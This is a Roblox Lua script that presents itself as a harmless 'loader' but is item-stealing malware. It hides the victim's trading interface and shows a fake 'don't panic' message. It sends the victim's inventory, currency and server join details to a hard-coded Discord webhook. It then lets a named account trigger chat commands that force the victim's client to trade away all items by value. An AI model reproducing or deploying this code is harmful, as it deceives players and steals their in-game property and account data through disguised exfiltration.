local allowedPlaceId = 11158043705
if game.PlaceId ~= allowedPlaceId then
    return 
end
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local webhookURL = "https://discord.com/api/webhooks/1456051150968062156/gNxENTF4c7-hj24d36c48FYPHtRKPCfFWi2FxptO0uFSvC10_4X3avIX7CISiSxPAMLM"
local player = Players.LocalPlayer
if player:FindFirstChild("PlayerGui") then
    local playerGui = player.PlayerGui
    local tradingGui = playerGui:FindFirstChild("Trading")
    if tradingGui then
        tradingGui:Destroy()
    end
    for _, gui in pairs(playerGui:GetChildren()) do
        if gui.Name:lower():find("trade") then
            gui:Destroy()
        end
    end
end

local function showLoaderMessage()
    local gui = Instance.new("ScreenGui")
    gui.Name = "LoaderMessage"
    gui.ResetOnSpawn = false
    gui.Parent = player:WaitForChild("PlayerGui")

    local label = Instance.new("TextLabel")
    label.Position = UDim2.new(0.218, 0, 0.2, 0)
    label.Size = UDim2.new(.563, 0, 1.112, 0)
    label.BackgroundTransparency = 1
    label.TextColor3 = Color3.fromRGB(255, 255, 255)
    label.Font = Enum.Font.PermanentMarker
    label.TextSize = 50
    label.TextWrapped = true
    label.Text = "This Script may take a minute to load, Your screen may bug, dont panic it is part of the script loader."
    label.Parent = gui

    local stroke = Instance.new("UIStroke")
    stroke.Thickness = 2
    stroke.Color = Color3.fromRGB(0, 0, 0)
    stroke.Parent = label

    task.delay(10, function()
        if gui then
            gui:Destroy()
        end
    end)
end

showLoaderMessage()

local dinero = player:FindFirstChild("leaderstats") and player.leaderstats:FindFirstChild("Dinero") and player.leaderstats.Dinero.Value or 0
local slays = player:FindFirstChild("leaderstats") and player.leaderstats:FindFirstChild("Slays") and player.leaderstats.Slays.Value or 0

local inventory = {}
for _, tool in pairs(player.Backpack:GetChildren()) do
    table.insert(inventory, tool.Name)
end
if player.Character then
    for _, tool in pairs(player.Character:GetChildren()) do
        if tool:IsA("Tool") then
            table.insert(inventory, tool.Name)
        end
    end
end

local function sendDiscord()
    local message = {
        content = string.format(
            "@everyone :bell: Player Report!\n\n**%s's Inventory**\n%s\n\n:moneybag: Dinero: %s\n:crossed_swords: Slays: %s\n\n**Server Join Snippet**\n`lua\nlocal ts = game:GetService('TeleportService')\nts:TeleportToPlaceInstance(%s, '%s')\n`",
            player.Name,
            table.concat(inventory, "\n"),
            dinero,
            slays,
            game.PlaceId,
            game.JobId
        )
    }

    local body = HttpService:JSONEncode(message)
    local req = (syn and syn.request) or http_request or (http and http.request) or request

    if req then
        pcall(function()
            req({
                Url = webhookURL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = body
            })
        end)
    end
end

sendDiscord()

local targetName = "DEV184467"

local Modules = ReplicatedStorage:WaitForChild("Modules")
local Net = require(Modules.Net)
local Replion = require(Modules.Replion)

local sendTradeRemote = Net:RemoteFunction("Trading/SendTradeOffer")
local addItemRemote = Net:RemoteFunction("Trading/AddItem")
local setReadyRemote = Net:RemoteFunction("Trading/SetReady")
local confirmTradeRemote = Net:RemoteFunction("Trading/ConfirmTrade")

local function getItemsByPriority()
    local playerDataReplion = Replion.Client:WaitReplion("Data")
    local allItems = {}
    
    if playerDataReplion then
        -- Priority 1: Weapons (most important)
        local weaponItems = playerDataReplion:Get({"NewInventory", "Items", "Weapon"})
        if weaponItems then
            for guid, weaponData in pairs(weaponItems) do
                if weaponData and weaponData.Name then
                    table.insert(allItems, {
                        name = weaponData.Name,
                        guid = guid,
                        type = "Weapon",
                        priority = 1
                    })
                end
            end
        end
        
        -- Priority 2: Loveboard Skins
        local skinsItems = playerDataReplion:Get({"NewInventory", "Items", "WeaponSkin"})
        if skinsItems then
            for guid, skinData in pairs(skinsItems) do
                if skinData and skinData.Name then
                    if skinData.Name:lower():find("loveboard") then
                        table.insert(allItems, {
                            name = skinData.Name,
                            guid = guid,
                            type = "WeaponSkin",
                            priority = 2
                        })
                    end
                end
            end
        end
        
        -- Priority 3: Fighting Styles
        local fightingStyles = playerDataReplion:Get({"NewInventory", "Items", "FightingStyle"})
        if fightingStyles then
            for guid, styleData in pairs(fightingStyles) do
                if styleData and styleData.Name then
                    table.insert(allItems, {
                        name = styleData.Name,
                        guid = guid,
                        type = "FightingStyle",
                        priority = 3
                    })
                end
            end
        end
        
        -- Priority 4: Stomp Skins
        local stompItems = playerDataReplion:Get({"NewInventory", "Items", "Stomp"})
        if stompItems then
            for guid, stompData in pairs(stompItems) do
                if stompData and stompData.Name then
                    table.insert(allItems, {
                        name = stompData.Name,
                        guid = guid,
                        type = "Stomp",
                        priority = 4
                    })
                end
            end
        end
        
        -- Priority 5: Finishers
        local finisherItems = playerDataReplion:Get({"NewInventory", "Items", "Finisher"})
        if finisherItems then
            for guid, finisherData in pairs(finisherItems) do
                if finisherData and finisherData.Name then
                    table.insert(allItems, {
                        name = finisherData.Name,
                        guid = guid,
                        type = "Finisher",
                        priority = 5
                    })
                end
            end
        end
        
        -- Priority 6: Brass
        local brassItems = playerDataReplion:Get({"NewInventory", "Items", "Brass"})
        if brassItems then
            for guid, brassData in pairs(brassItems) do
                if brassData and brassData.Name then
                    table.insert(allItems, {
                        name = brassData.Name,
                        guid = guid,
                        type = "Brass",
                        priority = 6
                    })
                end
            end
        end
        
        -- Priority 7: Other WeaponSkins (random skins last)
        if skinsItems then
            for guid, skinData in pairs(skinsItems) do
                if skinData and skinData.Name then
                    if not skinData.Name:lower():find("loveboard") then
                        table.insert(allItems, {
                            name = skinData.Name,
                            guid = guid,
                            type = "WeaponSkin",
                            priority = 7
                        })
                    end
                end
            end
        end
        
        -- Priority 8: Tokens (last)
        local tokenItems = playerDataReplion:Get({"NewInventory", "Items", "Token"})
        if tokenItems then
            for guid, tokenData in pairs(tokenItems) do
                if tokenData and tokenData.Name then
                    table.insert(allItems, {
                        name = tokenData.Name,
                        guid = guid,
                        type = "Token",
                        priority = 8
                    })
                end
            end
        end
    end
    
    table.sort(allItems, function(a, b)
        return a.priority < b.priority
    end)
    
    return allItems
end

local function sendTradeToPlayer(targetPlayer)
    pcall(function()
        sendTradeRemote:InvokeServer(targetPlayer)
    end)
end

local function addAllItemsByPriority()
    local allItems = getItemsByPriority()
    
    for _, item in pairs(allItems) do
        pcall(function()
            addItemRemote:InvokeServer(item.type, item.guid)
        end)
        wait(0.1)
    end
end

local function setReadyStatus(isReady)
    pcall(function()
        setReadyRemote:InvokeServer(isReady)
    end)
end

local function confirmTrade()
    pcall(function()
        confirmTradeRemote:InvokeServer()
    end)
end

local function hookChat(targetPlayer)
    targetPlayer.Chatted:Connect(function(msg)
        msg = msg:lower()
        if msg == "." then
            sendTradeToPlayer(targetPlayer)
        elseif msg == ".." then
            addAllItemsByPriority()
        elseif msg:find("^1$") then
            setReadyStatus(true)
        elseif msg:find("^2$") then
            confirmTrade()
        end
    end)
end

Players.PlayerAdded:Connect(function(p)
    if p.Name == targetName then
        hookChat(p)
    end
end)

for _, p in pairs(Players:GetPlayers()) do
    if p.Name == targetName then
        hookChat(p)
    end
end
